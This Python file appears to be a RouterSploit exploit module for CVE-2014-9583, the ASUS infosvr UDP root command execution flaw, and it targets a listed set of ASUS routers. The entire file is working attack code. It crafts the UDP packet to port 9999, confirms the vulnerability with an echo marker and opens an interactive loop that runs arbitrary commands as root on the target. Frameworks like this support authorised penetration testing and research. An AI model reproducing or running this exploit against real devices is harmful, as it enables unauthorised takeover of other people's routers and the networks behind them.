import socket
import struct
import os

from routersploit import (
    exploits,
    print_status,
    print_success,
    print_info,
    print_error,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for multiple ASUS's Remote Code Execution vulnerability, known as infosvr UDP Broadcast root command execution aka CVE-2014-9583.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Asus Infosvr Backdoor RCE',
        'description': 'Module exploits remote command execution in multiple ASUS devices. If the target is '
                       'vulnerable, command loop is invoked that allows executing commands on operating system level.',
        'authors': [
            'Joshua \"jduck\" Drake; @jduck',  # vulnerability discovery
            'Friedrich Postelstorfer',  # original Python exploit
            'Michal Bentkowski; @SecurityMB',  # routersploit module
        ],
        'references': [
            'https://github.com/jduck/asus-cmd',
        ],
        'targets': [
            'ASUS RT-N66U',
            'ASUS RT-AC87U',
            'ASUS RT-N56U',
            'ASUS RT-AC68U',
            'ASUS DSL-N55U',
            'ASUS DSL-AC68U',
            'ASUS RT-AC66R',
            'ASUS RT-AC66R',
            'ASUS RT-AC55U',
            'ASUS RT-N12HP_B1',
            'ASUS RT-N16',
        ],
    }

    target = exploits.Option('', 'Target IP address e.g. 192.168.1.1')

    def run(self):
        try:
            if self.check():
                print_success("Target is vulnerable")
                print_status("Invoking command loop...")
                print_status("Please note that only first 256 characters of the output will be displayed")
                self.command_loop()
            else:
                print_error("Target is not vulnerable")
        except socket.error as ex:
            print_error("Socket error ({ex}). It most likely means that something else is listening locally on port UDP:{port}. Make sure to kill it before running the exploit again.".format(ex=ex, port=9999))

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")
            try:
                print_info(self.execute(cmd))
            except socket.timeout:
                print_error("No response received. The exploit tends to be unstable though. It is worth trying to run the same command again.")

    def execute(self, cmd):
        if len(cmd) > 237:
            print_error('Your command must be at most 237 characters long. Longer strings might crash the server.')
            return

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 9999))
        sock.settimeout(2)

        packet = (b'\x0C\x15\x33\x00'+ os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(cmd)) + cmd).ljust(512, b'\x00')

        try:
            sock.sendto(packet, (self.target, 9999))
        except socket.error:
            return ""

        while True:
            try:
                data, addr = sock.recvfrom(512)
            except socket.timeout:
                sock.close()
                raise
            if len(data) == 512 and data[1] == "\x16":
                break
        length = struct.unpack('<H', data[14:16])[0]
        output = data[16:16+length]
        sock.close()
        return output

    def check(self):
        NUM_CHECKS = 5  # we try 5 times because the exploit, tends to be unstable

        for i in xrange(NUM_CHECKS):
            # maybe random mark should be implemented
            random_value = "116b8df6aee055a05032ed26726c032914dc5dae"
            cmd = "echo {}".format(random_value)
            try:
                retval = self.execute(cmd)
            except socket.timeout:
                continue
            if random_value in retval:
                return True
        return False
